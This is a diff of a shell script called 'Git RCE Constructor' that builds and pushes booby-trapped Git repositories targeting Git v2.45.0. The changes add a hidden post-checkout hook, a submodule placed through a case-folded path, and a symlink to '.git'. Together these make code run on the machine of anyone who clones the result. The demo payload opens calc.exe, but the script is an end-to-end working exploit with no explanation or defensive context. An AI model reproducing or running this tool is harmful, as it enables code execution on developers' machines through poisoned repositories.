@@ -6,8 +6,8 @@ echo -n "Operation failed!"
 read -N 1
 exit 0
 }
-echo Git RCE Constructor v1.8.0 \(Update Mode\)
-echo -e "\033]0;Git RCE Constructor v1.8.0 (Update Mode)\007"
+echo Git RCE Constructor v1.8.0 \(Remote Mode With Shallow Clone\)
+echo -e "\033]0;Git RCE Constructor v1.8.0 (Remote Mode With Shallow Clone)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 read -r -p "Main repository URL: " main_repo_path
 read -r -p "Hook repository URL: " hook_repo_path
@@ -22,39 +22,60 @@ fi
 if [ -z "$(git config --global user.email)" ]; then
 git config --global user.email "$USERNAME"
 fi
-echo Updating hook repo...
+echo Constructing hook repo...
 mkdir -p git_rce_hook
 if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
 fsutil file setcasesensitiveinfo git_rce_hook disable
 fi
 git clone --recursive "$hook_repo_path" git_rce_hook ||error_handler
 cd git_rce_hook ||error_handler
+mkdir -p scripts/hooks ||error_handler
+cat > scripts/hooks/post-checkout <<EOF
+#!/bin/bash
+set -x
+cd ../../..
+export GIT_DIR="\$PWD/.git"
+export GIT_WORK_TREE="\$PWD"
+echo 'git -C GITLNK/modules/RCE hook run post-checkout -- "\$(git rev-parse HEAD)" "\$(git rev-parse HEAD)" 1' >Call-Post-Checkout.sh
+touch .git/info/exclude
+grep -qxF 'Call-Post-Checkout.sh' .git/info/exclude||echo 'Call-Post-Checkout.sh' >>.git/info/exclude
+echo 'It works!' >Test.txt
+git add Test.txt
+git diff --cached --quiet HEAD ||git commit -m "test"
+CMD <<END
+start explorer "C:\Windows\System32\calc.exe"
+echo.It works!
+END
+sleep 1
+unset GIT_DIR
+unset GIT_WORK_TREE
+exit 0
+EOF
+chmod +x scripts/hooks/post-checkout ||error_handler
 git_editor=$(git config --get core.editor)
 if [ -z "$git_editor" ]; then
 git_editor="VIM"
 fi
 "$git_editor" "$PWD/scripts/hooks/post-checkout"
 git add scripts/hooks/post-checkout ||error_handler
-git diff --cached --quiet HEAD ||git commit -m "update-post-checkout" ||error_handler
+git diff --cached --quiet HEAD ||git commit -m "add-post-checkout" ||error_handler
 git push origin HEAD ||error_handler
 cd .. ||error_handler
-echo Updating main repo...
+echo Constructing main repo...
 mkdir -p git_rce_main
 if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
 fsutil file setcasesensitiveinfo git_rce_main disable
 fi
-git clone --no-recursive "$main_repo_path" git_rce_main ||error_handler
+git clone --no-recursive --filter=blob:none --depth=1 --single-branch --no-tags --no-checkout "$main_repo_path" git_rce_main ||error_handler
 cd git_rce_main ||error_handler
-git rm gitlnk ||error_handler
-git diff --cached --quiet HEAD ||git commit -m "remove-symlink" ||error_handler
-git submodule update --init --recursive ||error_handler
-git submodule set-url GITLNK/modules/RCE "$hook_repo_path" ||error_handler
-git -C GITLNK/modules/RCE fetch origin --prune ||error_handler
-git -C GITLNK/modules/RCE remote set-head origin --auto ||error_handler
-git submodule update --remote GITLNK/modules/RCE ||error_handler
+git reset --no-refresh --mixed --quiet HEAD ||error_handler
+git restore --worktree --source=HEAD .gitmodules
+git diff --cached --quiet HEAD ||error_handler
+git checkout HEAD .gitmodules ||error_handler
+git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE ||error_handler
 git config -f .gitmodules submodule.RCE/scripts.ignore all ||error_handler
-git add .gitmodules GITLNK/modules/RCE ||error_handler
-git diff --cached --quiet HEAD ||git commit -m "update-submodule" ||error_handler
+git add .gitmodules ||error_handler
+git diff --cached --quiet HEAD ||git commit -m "add-submodule" ||error_handler
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk ||error_handler
 git diff --cached --quiet HEAD ||git commit -m "add-symlink" ||error_handler
 xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
